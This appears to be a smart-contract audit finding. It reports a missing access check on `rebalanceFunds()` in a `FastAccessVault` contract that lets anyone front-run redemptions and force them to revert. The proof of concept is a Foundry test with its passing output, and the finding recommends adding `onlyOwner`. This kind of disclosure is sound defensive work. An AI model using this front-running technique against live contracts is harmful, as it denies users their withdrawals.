  "body": "## Description\nThe `FastAccessVault` contract has a critical race condition vulnerability where anyone can call `rebalanceFunds()` to drain excess funds immediately before a user's redemption, causing the redemption to fail and defeating the vault's purpose of providing instant redemptions.\nThe `rebalanceFunds()` function is external with no access control, allowing anyone to trigger it.  When called, it immediately transfers excess funds above the target buffer to the custodian. \n```solidity\n/// @inheritdoc IFastAccessVault\n    function rebalanceFunds() external { //@ > External function can cause race condition where bad user can frontrun to DoS the vault.\n        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n        uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n```\n\nThe `IFastAccessVault` contract also lacks the onlyOwner check making this attack possible\n```solidity\n /**\n     * @notice Rebalance the vault to match target buffer levels\n     * @dev Only callable by owner. Requests top-up from custodian if under target,\n     *      or transfers excess to custodian if over target\n     *\n     */\n    function rebalanceFunds() external; //@> Natspec said only owner can call, but implementation lacks that check.\n\n```\nAn attacker can monitor the mempool for redemption transactions and front-run them by calling `rebalanceFunds()` to drain the vault's buffer. When the user's redemption transaction executes, `processTransfer()` will revert with `InsufficientBufferBalance` because the vault no longer has sufficient funds \n\n## Impact\n* Undermines the core purpose of `FastAccessVault`: \"instant iTRY redemptions without custodian delays\"\n* Creates a denial-of-service condition for legitimate users\n* An attacker can consistently block large withdrawals at little cost, disrupting protocol operations.\n* Can be exploited repeatedly to disrupt protocol operations\n\n## Recommended mitigation steps\n* Implement `onlyOwner` check on `rebalanceFunds()`",
  "proof_of_concept": "The following test function was added to the `FastAccessVault.t.sol` test file and produced these logs:\n```bash\nRan 1 test for test/FastAccessVault.t.sol:FastAccessVaultTest\n[PASS] test_FrontRunRebalance_DoS() (gas: 79215)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 37.32ms (10.20ms CPU time)\n\nRan 1 test suite in 298.68ms (37.32ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nThe test:\n```solidity\n    /// @notice PoC: Front-running rebalanceFunds causes DoS on legitimate transfers\n    /// @dev Demonstrates how public rebalanceFunds can be used to grief redemptions\n    function test_FrontRunRebalance_DoS() public {\n        // 1. Setup Scenario\n        // Set Target Buffer to 50% for clear math (Default is 5%)\n        vault.setTargetBufferPercentage(5000); \n\n        //  Set Minimum Buffer to 0. \n        // Otherwise, the default 50k minimum overrides our calculated target (1000)\n        vault.setMinimumBufferBalance(0);\n\n        // Set AUM to 2000. Target Buffer = 50% of 2000 = 1000.\n        _updateAUM(2000e18);\n        \n        // Fund Vault with 1500 (Overfunded).\n        // Current (1500) > Target (1000).\n        _setupVaultWithBalance(1500e18);\n\n        // 2. Valid User Intent\n        // User wants to redeem 1200. \n        // 1500 (Available) > 1200 (Request). This SHOULD succeed.\n        uint256 redemptionAmount = 1200e18;\n\n        \n        // 3. The Attack\n        // Attacker sees pending transaction and calls rebalanceFunds()\n        vm.prank(attacker);\n        vault.rebalanceFunds();\n\n        // 4. Result Verification\n        // Vault is drained to Target (1000)\n        assertEq(vault.getAvailableBalance(), 1000e18, \"Vault should be drained to target\");\n\n        // User transaction reverts because 1000 < 1200\n        vm.prank(address(issuerContract));\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                IFastAccessVault.InsufficientBufferBalance.selector, \n                redemptionAmount, \n                1000e18\n            )\n        );\n        vault.processTransfer(user1, redemptionAmount);\n    }\n```",
